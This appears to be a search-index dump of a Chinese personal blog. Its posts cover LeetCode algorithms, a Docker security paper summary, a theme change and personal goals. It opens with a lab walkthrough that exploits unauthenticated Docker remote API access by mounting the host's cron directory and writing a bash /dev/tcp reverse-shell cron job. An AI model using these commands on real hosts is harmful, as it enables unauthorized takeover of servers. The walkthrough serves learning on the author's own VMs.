","date":"2021-02-07","objectID":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/:1:2","series":null,"tags":["Linux","Docker"],"title":"Docker逃逸系列1:Docker remote api未授权访问","uri":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/#查看效果"},{"categories":["实践记录"],"content":"步骤2、漏洞测试 ","date":"2021-02-07","objectID":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/:2:0","series":null,"tags":["Linux","Docker"],"title":"Docker逃逸系列1:Docker remote api未授权访问","uri":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/#步骤2漏洞测试"},{"categories":["实践记录"],"content":"创建容器 查看docker宿主机上已有的镜像 ┌──(lzy㉿kaliForZy)-[~] └─$ docker -H tcp://192.168.170.129:2375 images REPOSITORY TAG IMAGE ID CREATED SIZE alpine latest e50c909a8df2 9 days ago 5.61MB ubuntu 18.04 c090eaba6b94 2 weeks ago 63.3MB hello-world latest bf756fb1ae65 13 months ago 13.3kB 然后创建容器。因为最后反弹shell的实现方式是使用crontab计划任务，所以需要将crontab用到的文件所在路径，也就是宿主机的var/spool/cron目录挂载到容器中。 ┌──(lzy㉿kaliForZy)-[~] └─$ docker -H tcp://192.168.170.129:2375 run -it -v /var/spool/cron/:/get3cad/ c090 /bin/bash ubuntu的crontab相关文件的路径为var/spool/cron/crontabs/root，但是我自己装的虚拟机在该路径下并不存在root文件。所以在进入到容器中后，要切换到相应路径（也可以在创建容器的时候就使用chroot参数），然后创建文件。 root@22b103440b66:/get3cad/crontabs# touch root 需要注意，创建的root文件默认是644权限，在crontab执行的时候会被认为是不安全模式。所以需要修改权限为600。 644644 \" 644 securesecure \" secure root@22b103440b66:/get3cad/crontabs# chmod 600 root 最后往root文件中写入反弹shell的计划任务。同时，因为sh与bash环境的不同，需要将命令用bash -c包含起来。 root@22b103440b66:/get3cad/crontabs# echo '* * * * * bash -c \"bash -i \u003e\u0026/dev/tcp/192.168.170.128/7777 0\u003e\u00261\"' \u003e\u003e /get3cad/crontabs/root 在攻击者主机中使用nc监听，连接到反弹的shell shellshell \" shell 除反弹shell之外，在宿主机开启了ssh服务的情况下，还可以通过修改配置文件，放入攻击者公钥的情况下，实现ssh远程登录，也可以达到和上述crontab计划任务反弹shell相同的效果。 ","date":"2021-02-07","objectID":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/:2:1","series":null,"tags":["Linux","Docker"],"title":"Docker逃逸系列1:Docker remote api未授权访问","uri":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/#创建容器"},{"categories":["实践记录"],"content":"其他收获 又发现了几个🐂人的博客 Linux中执行sudo -i切换到sudo模式，就能够cd到权限不够的路径，这个算是回忆吧 发现一个很有意思的docker镜像：busybox，小而精悍，瑞士军刀 资源网站：shodan，搜索互联网设备，所以不要轻易将自己的端口暴露在公网。看到这个网站是因为有人没有自己搭环境实现，所以用这个网站搜索现有的开放了远程api的docker环境。从这些博客的尝试结果来看，似乎很多有这一漏洞的docker环境，都被别人植入了挖矿程序。 前前后后花了4 5个小时，踩坑也是踩了蛮多的。网上的相关博客也有很多，除去内容重复的一些后，我觉得比较有参考价值的都放在下面了。 ","date":"2021-02-07","objectID":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/:3:0","series":null,"tags":["Linux","Docker"],"title":"Docker逃逸系列1:Docker remote api未授权访问","uri":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/#其他收获"},{"categories":["实践记录"],"content":"参考链接： Docker remote api漏洞公告 开启docker的remote api 踩坑：解决ubuntu-crontab反弹shell失败的问题 他人的实现： 🐂人博客之一 https://www.ouyangxiaoze.com/2020/08/617.html ","date":"2021-02-07","objectID":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/:4:0","series":null,"tags":["Linux","Docker"],"title":"Docker逃逸系列1:Docker remote api未授权访问","uri":"/2021-02-07-docker-remote-api%E9%80%83%E9%80%B8%E5%A4%8D%E7%8E%B0/#参考链接"},{"categories":["文字"],"content":"更换主题的原因 本博客以前的主题是fluid，刚开始觉得看着非常舒服，也比较简洁。但是用久了就发现，每次当我想创建一篇博客记录一下自己的想法时，我都要去找首页的缩略图素材和博客的背景图素材。对于本来就比较懒散的我来说，这无疑是比较折磨的。于是，我想着开设博客的初心是写作，主体还应该是文字。所以，在看过几个使用cactus主题的大佬博客之后，我决定把主题也改为cactus。究其原因，我想是为了减少场外因素，提高自己的专注度吧。 ","date":"2021-02-06","objectID":"/2021-02-06-%E6%9B%B4%E6%8D%A2%E4%B8%BB%E9%A2%98%E4%B9%8Bcactus/:0:1","series":null,"tags":["碎碎念","Blog"],"title":"更换主题之cactus","uri":"/2021-02-06-%E6%9B%B4%E6%8D%A2%E4%B8%BB%E9%A2%98%E4%B9%8Bcactus/#更换主题的原因"},{"categories":["文字"],"content":"数学公式渲染 在更换主题为cactus之后，我发现原本的数学公式渲染不出来了。嗯，遇到问题就去谷歌吧。在尝试了几次之后，我按照这篇博客的方法解决了数学公式渲染的问题。 总的来说，需要卸载hexo原本的hexo-renderer-marked，然后安装hexo-renderer-kramed和hexo-renderer-mathjax。如果之前像我一样安装过hexo-math的话，也需要把hexo-math卸载。 最后再修改一些历史遗留问题就能够在网页上看到数学公式了。 ","date":"2021-02-06","objectID":"/2021-02-06-%E6%9B%B4%E6%8D%A2%E4%B8%BB%E9%A2%98%E4%B9%8Bcactus/:0:2","series":null,"tags":["碎碎念","Blog"],"title":"更换主题之cactus","uri":"/2021-02-06-%E6%9B%B4%E6%8D%A2%E4%B8%BB%E9%A2%98%E4%B9%8Bcactus/#数学公式渲染"},{"categories":["文字"],"content":"一些注意点 写作的时候一定要遵循markdown的语法规范。多行代码块的前后一定要留空行，否则当后面的内容中有行内代码块时，在渲染的时候\u003ccode\u003e块就不会继承段落P的样式属性，造成行内代码块独占一行的情况。 修改themes\\cactus\\source\\css\\style.styl文件中的code处，增加自定义的background-color属性，可以自定义行内代码块的背景颜色，原主题的同色有点不太好看。 ","date":"2021-02-06","objectID":"/2021-02-06-%E6%9B%B4%E6%8D%A2%E4%B8%BB%E9%A2%98%E4%B9%8Bcactus/:0:3","series":null,"tags":["碎碎念","Blog"],"title":"更换主题之cactus","uri":"/2021-02-06-%E6%9B%B4%E6%8D%A2%E4%B8%BB%E9%A2%98%E4%B9%8Bcactus/#一些注意点"},{"categories":null,"content":"经典数学题，计算小于n的质数的个数 统计所有小于非负整数 n 的质数的数量。 示例 1： 输入：n = 10 输出：4 解释：小于 10 的质数一共有 4 个, 它们是 2, 3, 5, 7 。 数据范围： 0 \u003c= n \u003c= 5 * 106 一看今天的每日一题，难度简单，我心想这不是10分钟就把它给冲了？看完之后才发现，它说它是简单题，它可不是简单题啊，它这是有备而来，它明明就是一道数学题。 ","date":"2020-12-03","objectID":"/2020-12-03-lc-204-%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE-%E8%AE%A1%E7%AE%97%E8%B4%A8%E6%95%B0%E4%B8%AA%E6%95%B0/:0:0","series":null,"tags":["Leetcode","Python3","数学"],"title":"Lc 204 经典题目-计算质数个数","uri":"/2020-12-03-lc-204-%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE-%E8%AE%A1%E7%AE%97%E8%B4%A8%E6%95%B0%E4%B8%AA%E6%95%B0/#"},{"categories":null,"content":"基础解法 最简单的想法当然是遍历从2开始的所有小于n的数，然后判断是否为质数，这样的话复杂度将会是$O(n \\sqrt{n})$，意料之内，会超时，所以这种方法不行。 ","date":"2020-12-03","objectID":"/2020-12-03-lc-204-%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE-%E8%AE%A1%E7%AE%97%E8%B4%A8%E6%95%B0%E4%B8%AA%E6%95%B0/:1:0","series":null,"tags":["Leetcode","Python3","数学"],"title":"Lc 204 经典题目-计算质数个数","uri":"/2020-12-03-lc-204-%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE-%E8%AE%A1%E7%AE%97%E8%B4%A8%E6%95%B0%E4%B8%AA%E6%95%B0/#基础解法"},{"categories":null,"content":"进阶 ","date":"2020-12-03","objectID":"/2020-12-03-lc-204-%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE-%E8%AE%A1%E7%AE%97%E8%B4%A8%E6%95%B0%E4%B8%AA%E6%95%B0/:2:0","series":null,"tags":["Leetcode","Python3","数学"],"title":"Lc 204 经典题目-计算质数个数","uri":"/2020-12-03-lc-204-%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE-%E8%AE%A1%E7%AE%97%E8%B4%A8%E6%95%B0%E4%B8%AA%E6%95%B0/#进阶"},{"categories":null,"content":"埃氏筛选 这种方法由希腊数学家厄拉多塞（Eratosthenes）提出，思路是遍历到一个质数$x$后，将其倍数$2\\times x$、$3\\times x$、$4\\times x$…都标记为合数，这样利用了数与数之间的关联性，减少了很多没必要的判断质数操作。进一步优化其时间复杂度，可以发现，不用从$2\\times x$开始，因为这样会对一个合数进行多次重复标记（比如$15 = 3\\times 5$），在计算3时会乘以5，而计算5时又会乘以3。所以可以从$x\\times x$开始标记。 class Solution: def countPrimes(self, n: int) -\u003e int: ''' 埃氏筛选法 ''' isPrime = [True for i in range(n)] res = 0 for j in range(2, n): if isPrime[j]: res += 1 print(j) tmp = j * j while tmp \u003c n: isPrime[tmp] = False tmp += j return res ","date":"2020-12-03","objectID":"/2020-12-03-lc-204-%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE-%E8%AE%A1%E7%AE%97%E8%B4%A8%E6%95%B0%E4%B8%AA%E6%95%B0/:2:1","series":null,"tags":["Leetcode","Python3","数学"],"title":"Lc 204 经典题目-计算质数个数","uri":"/2020-12-03-lc-204-%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE-%E8%AE%A1%E7%AE%97%E8%B4%A8%E6%95%B0%E4%B8%AA%E6%95%B0/#埃氏筛选"},{"categories":null,"content":"线性筛选 在埃氏筛选的基础上，还是会有重复的标记合数操作，比如30在遍历到3的时候，会被标记为合数($3\\times 3 \u003c 30$)，遍历到5的时候，又会被标记为合数。所以还需要对这个方法进行优化。前人已经想出的思路是空间换时间，在遍历的时候使用一个数组存储所遇见的质数，数组为[$P_0, P_1, …, P_i, …$]，并且对每个数$x$，将$x\\times P_i$标记为合数，并且到$x\\equiv 0 \\pmod {P_i}$时结束。 因为假如$x \\equiv 0 \\pmod {P_i}$，然后再往后标记，即将$x \\times P_{i+1}$标记为合数，那么因为$\\frac{x}{P_i} \\times P_{i+1} \u003e x$，所以在后面遍历到$\\frac{x}{P_i} \\times P_{i+1}$这个数时，将其乘以$P_{i}$就会把$x \\times P_{i+1}$标记为合数，与之前的操作重复，所以我们应该把到此停止，把$x \\times P_{i+1}$这个数留给后面的大于$x$的数去标记。 class Solution: def countPrimes(self, n: int) -\u003e int: ''' 线性筛选法 ''' primes = [] isPrime = [True for i in range(n)] for i in range(2, n): if isPrime[i]: primes.append(i) j = 0 while j \u003c len(primes) and i * primes[j] \u003c n: isPrime[i * primes[j]] = False if i % primes[j] == 0: break j += 1 # print(primes) return len(primes) 时间复杂度： $O(n)$，这一点是让我感觉比较出乎意料的，看来自己还是太菜了 :-(。 ","date":"2020-12-03","objectID":"/2020-12-03-lc-204-%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE-%E8%AE%A1%E7%AE%97%E8%B4%A8%E6%95%B0%E4%B8%AA%E6%95%B0/:2:2","series":null,"tags":["Leetcode","Python3","数学"],"title":"Lc 204 经典题目-计算质数个数","uri":"/2020-12-03-lc-204-%E7%BB%8F%E5%85%B8%E9%A2%98%E7%9B%AE-%E8%AE%A1%E7%AE%97%E8%B4%A8%E6%95%B0%E4%B8%AA%E6%95%B0/#线性筛选"},{"categories":["文字"],"content":"转眼间2020年已经只剩下最后一个月，暂且展望一下12月吧，也给自己定一些目标。 ","date":"2020-12-02","objectID":"/2020-12-02-%E8%BF%8E%E6%8E%A512%E6%9C%88%E7%9A%84%E5%88%B0%E6%9D%A5/:0:0","series":null,"tags":["Life"],"title":"迎接12月的到来","uri":"/2020-12-02-%E8%BF%8E%E6%8E%A512%E6%9C%88%E7%9A%84%E5%88%B0%E6%9D%A5/#"},{"categories":["文字"],"content":"状态 最近自己的状态应该是比以前要好了，虽然不时地还是会做出浪费时间的行为，但是比以前要好很多。 听的讲座增多，认识的人增多，也更加意识到了自己与大佬之间的差距。别人可以在大三大四就已经成为CTF某一方面的强者，而研一的我还在为小小的系统软件安全实验报告而费心。看来还是太菜，得多努力学习。 希望自己在这些方面也能有些天赋吧，既然初期的速度不同，那么只能通过更高的加速度来超越了那么只能先在人家屁股后面追赶了。 ","date":"2020-12-02","objectID":"/2020-12-02-%E8%BF%8E%E6%8E%A512%E6%9C%88%E7%9A%84%E5%88%B0%E6%9D%A5/:1:0","series":null,"tags":["Life"],"title":"迎接12月的到来","uri":"/2020-12-02-%E8%BF%8E%E6%8E%A512%E6%9C%88%E7%9A%84%E5%88%B0%E6%9D%A5/#状态"},{"categories":["文字"],"content":"目标 12月的首要目标，当然是把所有课的小作业大作业都完成吧，不过这个东西有ddl在，也没啥太好担心的。 12月吧，也给自己定一些目标 其次希望能够阅读5篇以上的文献，对Linux系统和Docker安全有一些实际动手的操作经历，毕竟得给Eric点面子呀 :-D 然后继续保持早睡早起，规律饮食、运动，少浪费时间吧。 如果有时间的话，应该会在31号写一篇对自己过去一年的总结，希望能够完成！ 以后的路不再会有痛苦 我们的未来该有多酷 ","date":"2020-12-02","objectID":"/2020-12-02-%E8%BF%8E%E6%8E%A512%E6%9C%88%E7%9A%84%E5%88%B0%E6%9D%A5/:2:0","series":null,"tags":["Life"],"title":"迎接12月的到来","uri":"/2020-12-02-%E8%BF%8E%E6%8E%A512%E6%9C%88%E7%9A%84%E5%88%B0%E6%9D%A5/#目标"},{"categories":["算法"],"content":" Leetcode 493题 难度：困难 想把这题记录下来的原因，主要是题解的归并算法思路比较典型，所以希望能够记住并掌握这种方法。 题目要求对一个数组进行处理，计算出所有满足nums[i] \u003e 2*nums[j]且i \u003c j的(i, j)对的个数。测试用例中最长数组长度为50000。那很显然，不能两次遍历，因为O(n^2)肯定会超时的。所以需要寻求其他方法。 再次思考要求，i与j的前后顺序是确定的，而且又是处理数组，并且要求低于O(n^2)的复杂度，所以应该想到归并排序（当然现在的我是上帝视角🤣）。 归并排序的过程中，每次合并两个已经排好序的数组时，对于固定前后顺序的下标处理就会变得简单许多了。 在实现的时候，还可以继续对处理过程进行部分优化，python3实现代码如下： from typing import List import time import random class Solution: def reversePairs(self, nums: List[int]) -\u003e int: ''' 这样就不超时了 但是还是很慢🙄 ''' def countPairs(left: int, mid: int, right: int) -\u003e int: res = 0 lastj = mid + 1 # 由于左右两边是已经排好序的，所以这里可以优化，对第一个之后的i，j并不需要从头开始遍历 for i in range(left, mid + 1): while lastj \u003c= right and nums[i] \u003e 2 * nums[lastj]: lastj += 1 res += lastj - (mid + 1) return res def mergeAndCount(left: int, right: int) -\u003e int: if left == right: return 0 mid = (left + right) // 2 res = mergeAndCount(left, mid) + mergeAndCount(mid + 1, right) + countPairs(left, mid, right) i,j,k = left, mid+1, left while i \u003c mid+1 and j \u003c right+1: if nums[i] \u003c nums[j]: sortedNums[k] = nums[i] i += 1 else: sortedNums[k] = nums[j] j += 1 k += 1 while i \u003c mid+1: sortedNums[k] = nums[i] i += 1 k += 1 while j \u003c right+1: sortedNums[k] = nums[j] j += 1 k += 1 for t in range(left, right+1): nums[t] = sortedNums[t] return res if not nums: return 0 sortedNums = [0 for i in range(len(nums))] return mergeAndCount(0, len(nums)-1) if __name__ == \"__main__\": s = Solution() nums = [1, 26, 20, 66, 28, 75, 78, 15, 40, 64] # random.seed(time.time()) # for i in range(10): # nums.append(random.randrange(1,100)) print(nums) print(s.reversePairs(nums)) print(nums) 327题同样也用到了这个思想，博客记录在这 ","date":"2020-11-28","objectID":"/2020-11-28-leetcode-493-%E7%BF%BB%E8%BD%AC%E5%AF%B9/:0:0","series":null,"tags":["Leetcode","Python3","归并"],"title":"Leetcode 493 翻转对","uri":"/2020-11-28-leetcode-493-%E7%BF%BB%E8%BD%AC%E5%AF%B9/#"},{"categories":null,"content":"一篇关于Docker安全的综述性Paper ","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:0:0","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#"},{"categories":null,"content":"1.文章基本信息 Title：Analysis Of Docker Security Author：Thanh Bui, Aalto University School of Science 发布日期：2015.1.13 链接：https://arxiv.org/abs/1501.02967 ","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:1:0","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#1文章基本信息"},{"categories":null,"content":"2.内容概括 这篇文章主要对Docker安全进行了总体上的分析，偏向于资料搜集类型。 文章将Docker的安全分为两个大方面，一方面是Docker自身的安全，也可以看作是Docker各容器之间的安全，分析它们之间是否存在资源未授权访问等问题，另一方面是Docker与宿主机之间的安全问题 文章主要分析了Docker为了实现安全所采用的一些措施，比如使用Linux中的cgroups和namespace机制，以及使用Linux提供的AppArmor和SELinux安全模块。其实这些安全措施的基本思想，我认为都是资源隔离。通过资源隔离手段，让一个容器只能看到它所应该看到的资源。 最后，文章得出结论，Docker相比于虚拟机来说，能够实现更高密度的虚拟化环境，但是安全度比虚拟机要更低。但是，即使是使用默认配置，Docker本身也是挺安全的。给予一个容器太多特权，是比较危险的操作，更加安全的做法是不给容器特权（不知道理解得对不对🤣）。 ","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:2:0","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#2内容概括"},{"categories":null,"content":"3.文章各部分复述 ","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:3:0","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#3文章各部分复述"},{"categories":null,"content":"摘要 ","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:3:1","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#摘要"},{"categories":null,"content":"1.介绍 说明了虚拟化技术的使用场景和意义。 然后告诉你虚拟化技术可以分为两类，一类是基于容器的虚拟化技术（比如Docker），一类是基于监管程序（虚拟机）。 ","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:3:2","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#1介绍"},{"categories":null,"content":"2.虚拟化方法分析 介绍两种虚拟化技术。 基于容器： 操作系统层面 更加轻量级、节约资源 安全风险更高 基于监管程序 硬件层面 所需资源更多 安全性更高 ","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:3:3","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#2虚拟化方法分析"},{"categories":null,"content":"3.Docker Overview 告诉你Docker的优点，轻量级、适用多平台、用户友好、对第三方工具支持较好等… 然后主要介绍了Docker中的镜像概念。 多层文件系统 修改镜像——写时复制 以及Docker使用namespace和cgroups，来为容器提供安全性。我觉得需要理解掌握的是namespace机制。 Linux中的namespace机制，类似于C++中的namespace思想。这一机制将所有资源根据不同的命名空间划分为不同的抽象整体。处于同一namespace中的进程可以看到对方，并且可以看到该命名空间下的资源及其变化情况。 文章中说目前（2015年）Docker使用5种namespace，但是现在已经是6种，分别为： 种类 含义 UTS 主机和域名 IPC 信号量、消息队列和共享内容 PID 进程编号 network 网络设备、网络栈、端口等 mount 挂载点(文件系统) user 用户和用户组 ","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:3:4","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#3docker-overview"},{"categories":null,"content":"4.Docker安全分析 这一部分内容，首先指出一个操作系统层面的虚拟化技术，如果要保持安全，那么应该满足6点： 进程隔离 文件系统隔离 设备隔离 进程间通信隔离 网络隔离 分配资源的限制 其实这些和之前提到的namespace的内容很相像，然后文章开始分析Docker如何满足这些需求。其实就是使用对应类型的namespace来实现不同类型资源的隔离。不过在说明网络资源隔离的时候，因为默认情况下，宿主机的虚拟网卡docker0会转发所有的数据包，所以可能存在ARP欺骗和泛洪攻击的风险，不过在后面的内容中，文章也说明可以通过在宿主机为虚拟网卡设置转发过滤规则来减少或避免这一风险。 接下来文章分析了Docker与宿主机之间的安全问题。 首先介绍了Linux中的capability概念。在以前的Linux版本中，内核将进程分为普通和root级别，root级别的进程拥有所有权限。显然这种方式是存在风险的。capability就是对于权限的更加细粒度的划分。Linux中有很多个capability，每个capability对应一个特殊的权限。 Docker默认关闭了很多capability，来确保容器与宿主机之间的安全。 接下来文章介绍了AppArmor和SELinux这两种Linux安全模块。 ","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:3:5","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#4docker安全分析"},{"categories":null,"content":"5.讨论与总结 ","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:3:6","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#5讨论与总结"},{"categories":null,"content":"4.个人总结 这篇文章是对Docker安全的总体分析，介绍了一些Docker安全相关的基础概念，比如namespace、capability。因为是总体性的概述类文章，所以内容并不多，一个下午的时间足够看完并且写出这样一篇总结。 ","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:4:0","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#4个人总结"},{"categories":null,"content":"参考资料 Linux namespace详解 namespaces(7) — Linux manual page 使用clone函数 多种namespace示例 ","date":"2020-11-26","objectID":"/2020-11-26-analysis-of-docker-security-reading-notes/:5:0","series":null,"tags":["Docker","Paper"],"title":"Analysis Of Docker Security---Reading Notes","uri":"/2020-11-26-analysis-of-docker-security-reading-notes/#参考资料"},{"categories":["算法"],"content":"回溯算法是怎么回事呢，相信大家都听说过回溯算法，但是回溯算法的原理是什么呢，一般如何用代码实现呢？ 回溯算法，就是将每条路都走一遍，当到达正确的结果时，停止或者继续尝试从而获得所有的正确结果 刷了Leetcode上20+道关于回溯算法的题之后，感觉自己对于回溯算法有了一点点(小声bb)认识，特此记录并加深自己的印象。 有图为证有图为证 \" 有图为证 回溯算法一般是通过递归的形式来实现的。回溯的方式，按照回溯的目的可以分为两类，两种类型的回溯略有差别，但是本质都一样。 第一类：找出一个合适的结果 第二类：找出所有合适的结果 了解回溯算法，首先需要找出进行遍历的决策树。想象自己位于一个起点，在你面前有很多个路口，每个路口往前走可能又会有多个路口，最后有一条路口对应的路的尽头有你想要的东西，你需要找到你的目标，所有路口组成的所有路径，就是一个决策树。于是，解决回溯类型的算法题，首先需要将决策树，也就是多个路口组成的路径树找出来。比如在分割字符串的时候，每个间隔可以选择分割或者不分割，这样就构成了一个每个点有两个路口的决策路径树。 在提取出了这一概念之后，可以开始编写回溯的递归函数。 对于第一类的回溯，递归函数的模板一般如下： def backtrack(path, ...): if 满足终止条件: res = path return True result = False # result变量很关键，result为True说明已经找到了，从而不需要进行之后的尝试，使递归能够正确结束 for 选择 in 候选列表: path.append(选择) # 做出选择 if backtrack(newpath, ...): result = True break path.pop(选择) # 撤销这一次选择 return result 对于第二类的回溯问题，需要找出所有合适的路径，所以递归函数一般不返回值 def backtrack(path, ...): if 满足终止条件: if path not in res: res.append(path) for 选择 in 候选列表: path.append(选择) # 做出选择 backtrack(newpath, ...): path.pop(选择) # 撤销这一次选择 对于以上的函数模板，通常终止条件与path或者path之后的参数有关(比如字符串索引等)，而候选列表一般由path之后的参数决定。path记录的就是当前做出的所有选择，res中append的值也不一定是path，但是一般都可以由path这一变量得到。 回溯算法除了能够正确得到结果之外，有的时候为了解决超时这一问题，还需要对degwr选择进行过滤，或者采用更高级的方式进行剪枝。 最后，放一下自己独立完成的Leetcode 89题——格雷码的回溯算法代码。 from typing import List class Solution: def grayCode(self, n: int) -\u003e List[int]: ''' 回溯算法 ''' visited = [0] total = int(pow(2, n)) # 对于result变量的创建和赋值很关键，它影响了之后的执行流 def backtrack(num: int, count: int): # 如果满足结束条件 if count == total: return True result = False for i in range(n): tmp = 0 if (num \u003e\u003e i) \u0026 1: tmp = num - pow(2, i) else: tmp = num + pow(2, i) if tmp in visited: continue visited.append(tmp) if backtrack(tmp, count+1): result = True break visited.pop() return result backtrack(0, 1) return visited if __name__ == \"__main__\": s = Solution() print(s.grayCode(4)) ","date":"2020-11-13","objectID":"/2020-11-13-%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95%E7%90%86%E8%A7%A3/:0:0","series":null,"tags":["Python3","Algorithm"],"title":"回溯算法理解","uri":"/2020-11-13-%E5%9B%9E%E6%BA%AF%E7%AE%97%E6%B3%95%E7%90%86%E8%A7%A3/#"},{"categories":["算法"],"content":"Leetcode 327题 计算数组区间和的时候，经常用到前缀和这一思想。比如这题。 在看官方题解的第一种方法时，我无法理解为何可以在对前缀和数组进行归并排序的过程中，计算符合条件的区间数目。再看几遍才懂，当把左右两个已经排好序的数组进行归并的时候，因为左右的位置原因，所以可以保证右边数组中的元素减去左边数组中的元素所得到的结果，会是一个合法的区间和数据。再利用归并的递归思想，就可以得到想要的结果。 python代码如下： # 最容易理解的思路：前缀和 class Solution: def countRangeSum(self, nums: List[int], lower: int, upper: int) -\u003e int: def countRec(lower: int, upper: int, left: int, right: int) -\u003e int: if left == right: return 0 # n1 n2 分别代表左半边和右半边前缀和数组中存在的符合条件的下标对数 n1 = countRec(lower, upper, left, (left+right)//2) n2 = countRec(lower, upper, (left+right)//2+1, right) res = n1+n2 # 接下来计算一个下标在左数组，一个下标在右数组的对数 i = left L = R = (left+right)//2+1 # 移动L与R while i \u003c= (left+right)//2: while L\u003c=right and sums[L]-sums[i] \u003c lower: L+=1 while R\u003c=right and sums[R]-sums[i] \u003c= upper: R+=1 res += (R-L) i += 1 # 为了保证左右数组的有序性，需要在这里进行归并排序 # 创建临时数组 sortedNums = [] p1 = left p2 = (left+right)//2+1 while p1 \u003c= (left+right)//2 or p2 \u003c= right: if p1 \u003e (left+right)//2: while p2 \u003c= right: sortedNums.append(sums[p2]) p2+=1 elif p2 \u003e right: while p1 \u003c= (left+right)//2: sortedNums.append(sums[p1]) p1+=1 else: if sums[p1] \u003c sums[p2]: sortedNums.append(sums[p1]) p1+=1 else: sortedNums.append(sums[p2]) p2+=1 # 修改待排序数组 for i in range(len(sortedNums)): sums[left+i] = sortedNums[i] return res # 首先计算前缀和数组 sums = [0] for item in nums: sums.append(sums[-1]+item) return countRec(lower, upper, 0, len(nums)) ","date":"2020-11-07","objectID":"/2020-11-07-leetcode-327-count-of-range-sum/:0:0","series":null,"tags":["Leetcode","Python3","归并"],"title":"Leetcode 327 count-of-range-sum","uri":"/2020-11-07-leetcode-327-count-of-range-sum/#"},{"categories":["文字"],"content":" 路漫漫其修远兮，吾将上下而求索 ","date":"2020-11-03","objectID":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/:0:0","series":null,"tags":["Life","Blog"],"title":"为什么想要写博客","uri":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/#"},{"categories":["文字"],"content":"自我认识 我自认为是一个比较懒散的人，不够勤奋刻苦。久而久之，思想也容易变得懒散起来，专注度不够高。 所以，我认为自己需要改变。当然，这个“改变”不可能是一夜之间就能实现的，而是逐渐调整自己的个人习惯，通过长久的打磨，使得自己的一些思想被替换，从而做事更加高效，这也算是自我愉悦的一种方式吧。 ","date":"2020-11-03","objectID":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/:1:0","series":null,"tags":["Life","Blog"],"title":"为什么想要写博客","uri":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/#自我认识"},{"categories":["文字"],"content":"为什么要写博客 ","date":"2020-11-03","objectID":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/:2:0","series":null,"tags":["Life","Blog"],"title":"为什么想要写博客","uri":"/2020-11-03-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%86%99%E5%8D%9A%E5%AE%A2/#为什么要写博客"},{"categories":["文字"],"content":"关于写作 